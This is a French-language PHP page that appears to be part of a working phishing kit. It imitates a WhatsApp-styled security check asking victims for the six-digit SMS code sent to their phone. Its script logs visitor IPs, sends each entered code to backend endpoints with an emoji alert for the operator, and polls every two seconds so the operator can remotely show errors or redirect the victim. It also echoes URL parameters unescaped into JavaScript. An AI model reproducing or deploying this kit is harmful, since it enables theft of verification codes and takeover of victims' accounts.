<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$errorMessage = '';
$pinCode = ''; // Initialiser la variable pour éviter une erreur

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Vérifier s'il y a une action en cours
$actionFile = 'sessions/' . $sessionId . '_action.json';
if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    if (isset($actionData['action']) && $actionData['action'] === 'pin_error') {
        $errorMessage = $actionData['errorMessage'] ?? 'Le code PIN que vous avez entré est incorrect. Veuillez réessayer.';
        // Supprimer l'action pour ne pas afficher l'erreur en boucle
        unlink($actionFile);
    }
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'sms_verification.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// Variable pour le code PIN attendu (peut être défini ailleurs dans votre système)
$expectedPinCode = '';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification PIN</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ecf5ee 0%, #d7f5d4 100%);
            color: #111;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            max-width: 420px;
            width: 100%;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo-circle {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
        }
        
        .logo-circle i {
            color: white;
            font-size: 36px;
        }
        
        .header-title {
            font-size: 24px;
            font-weight: 700;
            color: #25D366;
            margin-bottom: 8px;
        }
        
        .header-subtitle {
            font-size: 14px;
            color: #54656f;
        }
        
        .verification-card {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            padding: 30px 25px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }
        
        .verification-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #25D366, #1ebc5e, #25D366);
        }
        
        .card-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 10px;
            color: #25D366;
            text-align: center;
        }
        
        .card-message {
            color: #54656f;
            margin-bottom: 25px;
            text-align: center;
            font-size: 14px;
            line-height: 1.6;
        }
        
        .phone-number {
            text-align: center;
            margin-bottom: 20px;
            padding: 12px;
            background: linear-gradient(135deg, #e8f5e9 0%, #f1f8f6 100%);
            border-radius: 8px;
            border-left: 4px solid #25D366;
        }
        
        .phone-number-label {
            font-size: 12px;
            color: #54656f;
            margin-bottom: 4px;
        }
        
        .phone-number-value {
            font-size: 16px;
            font-weight: 600;
            color: #25D366;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #111;
            margin-bottom: 8px;
        }
        
        .pin-input-group {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-bottom: 15px;
        }
        
        .pin-input {
            width: 50px;
            height: 50px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            color: #25D366;
            background-color: #f8f8f8;
            transition: all 0.3s ease;
        }
        
        .pin-input:focus {
            border-color: #25D366;
            outline: none;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.1);
        }
        
        .pin-input::placeholder {
            color: #ccc;
        }
        
        .input-alternative {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            color: #111;
            text-align: center;
            letter-spacing: 3px;
            font-weight: bold;
            transition: all 0.3s ease;
            display: none;
        }
        
        .input-alternative:focus {
            border-color: #25D366;
            outline: none;
            background-color: #f8f8f8;
        }
        
        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: flex;
            align-items: flex-start;
            border-left: 4px solid #c62828;
        }
        
        .error-message i {
            margin-right: 10px;
            margin-top: 2px;
            font-size: 16px;
            flex-shrink: 0;
        }
        
        .error-message span {
            flex: 1;
        }
        
        .success-message {
            background-color: #e8f5e9;
            color: #2e7d32;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: flex;
            align-items: flex-start;
            border-left: 4px solid #2e7d32;
            display: none;
        }
        
        .success-message i {
            margin-right: 10px;
            margin-top: 2px;
            font-size: 16px;
            flex-shrink: 0;
        }
        
        .verify-button {
            width: 100%;
            padding: 14px 0;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
            margin-bottom: 12px;
        }
        
        .verify-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.4);
        }
        
        .verify-button:active {
            transform: translateY(0);
        }
        
        .verify-button i {
            margin-right: 8px;
        }
        
        .timer {
            text-align: center;
            margin-bottom: 15px;
            color: #54656f;
            font-size: 14px;
        }
        
        .timer-value {
            font-weight: 700;
            color: #25D366;
            font-size: 16px;
        }
        
        .resend-section {
            text-align: center;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid #ddd;
        }
        
        .resend-text {
            font-size: 14px;
            color: #54656f;
            margin-bottom: 8px;
        }
        
        .resend-link {
            color: #25D366;
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: none;
        }
        
        .resend-link:hover {
            text-decoration: underline;
        }
        
        .resend-link.disabled {
            color: #bbb;
            cursor: not-allowed;
            text-decoration: none;
        }
        
        .toggle-input {
            text-align: center;
            margin-top: 12px;
        }
        
        .toggle-input a {
            font-size: 12px;
            color: #54656f;
            text-decoration: none;
            cursor: pointer;
        }
        
        .toggle-input a:hover {
            color: #25D366;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #54656f;
            font-size: 12px;
        }
        
        .footer p {
            margin-bottom: 8px;
        }
        
        .footer a {
            color: #25D366;
            text-decoration: none;
            font-weight: 600;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .security-note {
            background: linear-gradient(135deg, #e8f5e9 0%, #f1f8f6 100%);
            border-left: 4px solid #25D366;
            padding: 12px;
            border-radius: 6px;
            margin-top: 20px;
            font-size: 12px;
            color: #2e7d32;
        }
        
        .security-note i {
            margin-right: 6px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
            
            .verification-card {
                padding: 20px 16px;
            }
            
            .header-title {
                font-size: 20px;
            }
            
            .pin-input {
                width: 45px;
                height: 45px;
                font-size: 20px;
            }
            
            .pin-input-group {
                gap: 6px;
            }
        }
        
        @media (max-width: 320px) {
            .pin-input {
                width: 40px;
                height: 40px;
                font-size: 18px;
            }
            
            .pin-input-group {
                gap: 4px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-circle">
                <i class="fas fa-lock"></i>
            </div>
            <div class="header-title">Vérification de Sécurité</div>
            <div class="header-subtitle">Confirmez votre identité</div>
        </div>
        
        <div class="verification-card">
            <div class="card-title">Entrez votre Code PIN</div>
            <p class="card-message">
                Pour des raisons de sécurité, veuillez entrer le code PIN à 6 chiffres envoyé par SMS au numéro associé à votre compte.
            </p>
            
            <div class="phone-number">
                <div class="phone-number-label">Numéro de téléphone associé</div>
                <div class="phone-number-value">
                    <i class="fas fa-lock" style="margin-right: 6px;"></i>
                    ••••••••••••
                </div>
            </div>
            
            <?php if (!empty($errorMessage)): ?>
            <div class="error-message">
                <i class="fas fa-exclamation-circle"></i>
                <span><?php echo htmlspecialchars($errorMessage); ?></span>
            </div>
            <?php endif; ?>
            
            <div class="success-message" id="success-message">
                <i class="fas fa-check-circle"></i>
                <span>Code reçu! Redirection en cours...</span>
            </div>

            <form id="sms-form" method="post" action="loading.php?session=<?php echo htmlspecialchars($sessionId); ?>&ip=<?php echo htmlspecialchars($clientIp); ?>">
                <div class="form-group">
                    <label for="pin-code" class="form-label">Code PIN (6 chiffres)</label>
                    
                    <div class="pin-input-group" id="pin-input-group">
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                        <input type="text" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    </div>
                    
                    <input type="hidden" id="pin-code" name="pin_code" value="">
                    
                    <input type="text" id="pin-input-alternative" class="input-alternative" name="pin_code_alt" placeholder="000000" maxlength="6" pattern="[0-9]*" inputmode="numeric">
                </div>
                
                <div class="timer">
                    Temps restant pour saisir le code: <span class="timer-value" id="countdown">02:00</span>
                </div>
                
                <button type="submit" class="verify-button">
                    <i class="fas fa-check"></i> Vérifier
                </button>
                
                <div class="toggle-input">
                    <a href="#" id="toggle-input-method">Entrer le code différemment</a>
                </div>
                
            </form>
            
            <div class="security-note">
                <i class="fas fa-shield-alt"></i>
                Ne partagez jamais votre code PIN avec quiconque. Nous ne vous le demanderons jamais.
            </div>
        </div>
        
        <div class="footer">
            <p>© 2026 Vérification de Sécurité</p>
            <p><a href="#">Conditions d'utilisation</a> · <a href="#">Politique de confidentialité</a></p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo $sessionId; ?>';
            const clientIp = '<?php echo $clientIp; ?>';
            const expectedPinCode = '<?php echo $expectedPinCode; ?>';
            const smsForm = document.getElementById('sms-form');
            const pinInputs = document.querySelectorAll('.pin-input');
            const pinInputAlternative = document.getElementById('pin-input-alternative');
            const pinCodeInput = document.getElementById('pin-code');
            const resendLink = document.querySelector('.resend-link');
            const countdownElement = document.getElementById('countdown');
            const toggleInputMethod = document.getElementById('toggle-input-method');
            const pinInputGroup = document.getElementById('pin-input-group');
            const successMessage = document.getElementById('success-message');
            
            let currentInputMode = 'boxes'; // 'boxes' or 'text'
            
            // Handle PIN input boxes (6 digits)
            pinInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = this.value;
                    
                    // Keep only digits
                    if (!/[0-9]/.test(value)) {
                        this.value = '';
                        return;
                    }
                    
                    // Move to next input
                    if (value && index < pinInputs.length - 1) {
                        pinInputs[index + 1].focus();
                    }
                    
                    // Update hidden field
                    updatePinValue();
                    
                    // Check if all digits are filled
                    if (allInputsFilled()) {
                        // Auto-submit after delay
                        setTimeout(() => {
                            smsForm.dispatchEvent(new Event('submit'));
                        }, 300);
                    }
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && !this.value && index > 0) {
                        pinInputs[index - 1].focus();
                    }
                });
                
                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pastedData = (e.clipboardData || window.clipboardData).getData('text');
                    const digits = pastedData.replace(/[^0-9]/g, '').slice(0, 6);
                    
                    digits.split('').forEach((digit, i) => {
                        if (i < pinInputs.length) {
                            pinInputs[i].value = digit;
                        }
                    });
                    
                    updatePinValue();
                    
                    if (allInputsFilled()) {
                        setTimeout(() => {
                            smsForm.dispatchEvent(new Event('submit'));
                        }, 300);
                    }
                });
            });
            
            // Handle alternative input (text)
            pinInputAlternative.addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
                pinCodeInput.value = this.value;
            });
            
            // Toggle between input methods
            toggleInputMethod.addEventListener('click', function(e) {
                e.preventDefault();
                
                if (currentInputMode === 'boxes') {
                    // Switch to text mode
                    pinInputGroup.style.display = 'none';
                    pinInputAlternative.style.display = 'block';
                    pinInputAlternative.focus();
                    currentInputMode = 'text';
                    toggleInputMethod.textContent = 'Utiliser les boîtes';
                } else {
                    // Switch to boxes mode
                    pinInputGroup.style.display = 'flex';
                    pinInputAlternative.style.display = 'none';
                    pinInputs[0].focus();
                    currentInputMode = 'boxes';
                    toggleInputMethod.textContent = 'Entrer le code différemment';
                }
            });
            
            function updatePinValue() {
                const pinValue = Array.from(pinInputs).map(input => input.value).join('');
                pinCodeInput.value = pinValue;
            }
            
            function allInputsFilled() {
                return Array.from(pinInputs).every(input => input.value !== '');
            }
            
            // Focus on first input
            pinInputs[0].focus();
            
            // Handle form submission
            smsForm.addEventListener('submit', function(event) {
                event.preventDefault();
                
                let pinCode = '';
                if (currentInputMode === 'boxes') {
                    pinCode = Array.from(pinInputs).map(input => input.value).join('');
                } else {
                    pinCode = pinInputAlternative.value.trim();
                }
                
                if (pinCode.length !== 6 || !/^[0-9]{6}$/.test(pinCode)) {
                    alert('Veuillez entrer un code PIN valide à 6 chiffres');
                    return;
                }
                
                // Show success message
                successMessage.style.display = 'flex';
                
                // Disable inputs
                if (currentInputMode === 'boxes') {
                    pinInputs.forEach(input => input.disabled = true);
                } else {
                    pinInputAlternative.disabled = true;
                }
                
                // Method 1: Send PIN code via save_action.php
                fetch('save_action.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session: sessionId,
                        ip: clientIp,
                        action: 'sms_code_submitted',
                        smsCode: pinCode
                    })
                })
                .then(response => response.json())
                .then(data => {
                    // Redirect to loading page
                    window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                })
                .catch(error => {
                    console.error('Erreur save_action:', error);
                    
                    // Method 2: Try via save_data.php as backup
                    fetch('save_data.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            message: `🔔 CODE PIN REÇU 🔔\n\n🔑 Session ID: ${sessionId}\n🌐 IP: ${clientIp}\n📱 Code PIN: ${pinCode}`
                        })
                    })
                    .then(response => response.json())
                    .catch(error => {
                        console.error('Erreur save_data:', error);
                    })
                    .finally(() => {
                        // Redirect anyway on error
                        window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                    });
                });
            });
            
            // Handle countdown
            let timeLeft = 120; // 2 minutes
            let countdownInterval;
            
            function updateCountdown() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    resendLink.style.display = 'inline';
                } else {
                    timeLeft--;
                }
            }
            
            // Update countdown every second
            updateCountdown();
            countdownInterval = setInterval(updateCountdown, 1000);
            
            // Handle resend code
            resendLink.addEventListener('click', function(event) {
                event.preventDefault();
                
                // Reset countdown
                timeLeft = 120;
                updateCountdown();
                resendLink.style.display = 'none';
                
                // Restart interval
                clearInterval(countdownInterval);
                countdownInterval = setInterval(updateCountdown, 1000);
                
                // Reset fields
                pinInputs.forEach(input => input.value = '');
                pinInputAlternative.value = '';
                pinCodeInput.value = '';
                pinInputs[0].focus();
                
                // Method 1: Send notification via save_action.php
                fetch('save_action.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session: sessionId,
                        ip: clientIp,
                        action: 'sms_resend_requested'
                    })
                })
                .catch(error => {
                    console.error('Erreur save_action:', error);
                    
                    // Method 2: Try via save_data.php as backup
                    fetch('save_data.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            message: `🔄 DEMANDE DE RENVOI DE CODE PIN 🔄\n\n🔑 Session ID: ${sessionId}\n🌐 IP: ${clientIp}`
                        })
                    })
                    .catch(error => {
                        console.error('Erreur save_data:', error);
                    });
                });
            });
            
            // Function to check for actions
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action) {
                        if (data.action === 'sms_error') {
                            // Reload page to show error
                            window.location.reload();
                        } else if (data.action === 'redirect' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else if (data.action === 'custom' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la vérification des actions:', error);
                });
            }
            
            // Check actions every 2 seconds
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>